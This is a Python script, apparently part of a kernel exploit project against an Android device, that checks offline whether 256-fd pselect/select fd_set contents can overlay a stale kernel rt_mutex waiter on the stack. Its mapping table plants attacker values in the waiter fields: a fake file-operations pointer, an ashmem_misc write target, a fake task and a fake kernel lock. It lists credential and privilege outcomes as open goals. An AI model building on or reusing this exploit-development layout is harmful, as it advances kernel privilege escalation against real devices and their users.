#!/usr/bin/env python3
"""Offline feasibility audit for a 256-fd pselect kernel-lock overlay.

The current Violin default is poll(fd=-1,nfds=1), whose stale waiter lock
overlaps zeroed poll_wqueues.  The only promising *static* alternative found
so far is a separate pselect/select configuration with nfds=256: core_sys_select
copies four words from each fd_set, and the fourth exceptfds word lands on the
stale waiter->lock at Q0+0xd8.  This script checks that mapping and the fd-mask
range constraint.  It does not claim that the PI tree or target write works.

No device, payload, build, adb, or kernel-facing operation is performed.
"""

from __future__ import annotations

import json
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]

NFDS = 256
BITS_PER_WORD = 64
WORDS_PER_SET = (NFDS + BITS_PER_WORD - 1) // BITS_PER_WORD
WAITER_BASE = "core_sys_select Q0+0x80"


def main() -> None:
    mapping = [
        {"set": "in", "word": 0, "waiter_offset": "+0x00", "field": "tree.__rb_parent_color", "value": "NULL"},
        {"set": "in", "word": 1, "waiter_offset": "+0x08", "field": "tree.rb_right", "value": "NULL"},
        {"set": "in", "word": 2, "waiter_offset": "+0x10", "field": "tree.rb_left", "value": "NULL"},
        {"set": "in", "word": 3, "waiter_offset": "+0x18", "field": "tree.prio", "value": "0x42424242"},
        {"set": "out", "word": 0, "waiter_offset": "+0x20", "field": "tree.deadline", "value": "0x43434343"},
        {"set": "out", "word": 1, "waiter_offset": "+0x28", "field": "pi_tree.__rb_parent_color", "value": "fake_fops (or controlled parent)"},
        {"set": "out", "word": 2, "waiter_offset": "+0x30", "field": "pi_tree.rb_right", "value": "NULL"},
        {"set": "out", "word": 3, "waiter_offset": "+0x38", "field": "pi_tree.rb_left", "value": "ashmem_misc+0x08 (candidate)"},
        {"set": "ex", "word": 0, "waiter_offset": "+0x40", "field": "pi_tree.prio", "value": "130"},
        {"set": "ex", "word": 1, "waiter_offset": "+0x48", "field": "pi_tree.deadline", "value": "0"},
        {"set": "ex", "word": 2, "waiter_offset": "+0x50", "field": "task", "value": "INIT_TASK or fake_task (identity pending)"},
        {"set": "ex", "word": 3, "waiter_offset": "+0x58", "field": "lock", "value": "fake_lock (kernel page)"},
    ]
    for row in mapping:
        # Each fd_set has its own fd namespace; the three sets are only
        # interleaved in the kernel stack copy order.
        base = row["word"] * 64
        row["fd_range"] = [base, base + 63]

    result = {
        "scope": "offline pselect/select overlay feasibility only",
        "kernel_evidence": {
            "core_sys_select_frame": "Q0 = T-0x280",
            "stale_waiter_base": "Q0+0x80",
            "stale_waiter_lock": "Q0+0xd8",
            "copy_order": "in[0..3], then out[0..3], then ex[0..3] contiguous",
            "source": "analysis_outputs/core-sys-select-20260719.disasm.txt",
        },
        "candidate": {
            "nfds": NFDS,
            "words_per_set": WORDS_PER_SET,
            "copied_bytes": 3 * WORDS_PER_SET * 8,
            "minimal_nfds_to_cover_lock": 256,
            "lock_control_word": "exceptfds[3]",
            "lock_control_fd_range": [192, 255],
        },
        "waiter_word_mapping": mapping,
        "fd_mask_constraint": {
            "static_result": "all pointer-mask bits remain within fd 0..255; open_selected_fds can duplicate a valid descriptor into set bits",
            "helper_observation": "current open_selected_fds already duplicates read_fd (not pipe write_fd) and covers fd 3..PSELECT_ROUTE_NFDS-1; fd 0..2 remain dependent on the process baseline",
            "not_closed": [
                "select/pselect readiness and fd 0..2 validity under the 256-fd masks",
                "exact stale waiter/task identity and pi-tree parent/color state",
                "rb_erase/insert target-slot write",
                "CFI, credential, or privilege result",
            ],
        },
        "comparison": {
            "current_default": "poll(fd=-1,nfds=1): lock reads zeroed poll_wqueues+0x198",
            "nfds_64": "only 24 bytes copied; waiter->lock at +0x58 is untouched",
            "nfds_256": "96 bytes copied; waiter->lock at +0x58 is controllable via ex[3]",
            "current_prepare_pselect_fdsets": "not aligned for this candidate: default writes deadline to in[4] (dropped at words_per_set=4) and places pi/task/lock values in different fields",
        },
        "decision": "promising offline branch, but requires a separately designed fd-set mapping; changing nfds alone is insufficient",
    }
    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
